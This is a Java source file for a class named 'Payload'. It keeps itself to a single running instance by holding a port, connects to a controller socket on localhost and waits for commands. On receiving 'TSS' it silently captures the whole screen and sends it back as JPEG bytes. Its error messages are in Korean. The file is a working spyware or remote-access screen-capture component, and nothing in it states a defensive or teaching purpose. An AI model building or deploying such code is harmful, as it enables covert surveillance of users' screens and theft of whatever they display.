package com.payload;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;

class pRes {
	
	public static Socket socket;
	public static final int LISTEN_PORT = 17201;

	public static ServerSocket corruptedBlockSocket;
	public static final int CORRUPTED_PORT = 17200;
}

class Cmd {
	
	public static final String TAKE_SCREEN_SHOT = "TSS";
}

public class Payload {
	
	private ObjectOutputStream oos;
	private DataInputStream dis;

	public static void main(String[] args) throws Exception {
		Payload payload = new Payload();
		payload.activate();
	}

	public void activate() {
		if (isAlreadyRunning())
			return;

		if (!connect())
			return;

		if (!getStream())
			return;

		listen();
	}

	private boolean isAlreadyRunning() {
		try {
			pRes.corruptedBlockSocket = new ServerSocket(pRes.CORRUPTED_PORT);
			return false;

		} catch (Exception e) {
			return true;
		}
	}

	private boolean connect() {
		try {
			pRes.socket = new Socket();
			pRes.socket.connect(new InetSocketAddress("127.0.0.1", pRes.LISTEN_PORT), 10000);
			return true;

		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}

	private boolean getStream() {
		try {
			oos = new ObjectOutputStream(pRes.socket.getOutputStream());
			dis = new DataInputStream(pRes.socket.getInputStream());
			return true;

		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}

	private void listen() {
		String cmd;
		while (true) {
			try {
				cmd = dis.readUTF();
			} catch (Exception e) {
				return;
			}
			
			if(cmd.equals(Cmd.TAKE_SCREEN_SHOT)) {
				if(!sendScreenShot())
					System.out.println("fail");
			}
		}
	}
	
	private boolean sendScreenShot() {
		try {
			oos.writeObject(getCurrentScreenCapture());
			return true;

		} catch (IOException e) {
			System.out.println("스크린샷 전송 실패");
			return false;
		}
	}

	private byte[] getCurrentScreenCapture() {
		BufferedImage image = getScreenBufferedImage();
		byte[] screenImageByteArray = getScreenImageByteArray(image);

		return screenImageByteArray;
	}

	private BufferedImage getScreenBufferedImage() {
		try {
			Toolkit toolkit = Toolkit.getDefaultToolkit();
			Dimension screenSize = toolkit.getScreenSize();
			Rectangle rect = new Rectangle(screenSize);

			Robot robot = new Robot();
			BufferedImage image = robot.createScreenCapture(rect);
			return image;

		} catch (Exception e) {
			System.out.println("로봇 이미지 캡쳐 실패");
			return null;
		}
	}
	
	private byte[] getScreenImageByteArray(BufferedImage image) {
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			ImageIO.write(image, "jpg", baos);
			baos.flush();
			return baos.toByteArray();

		} catch (Exception e) {
			System.out.println("이미지 바이트 추출 실패");
			return null;
		}
	}
}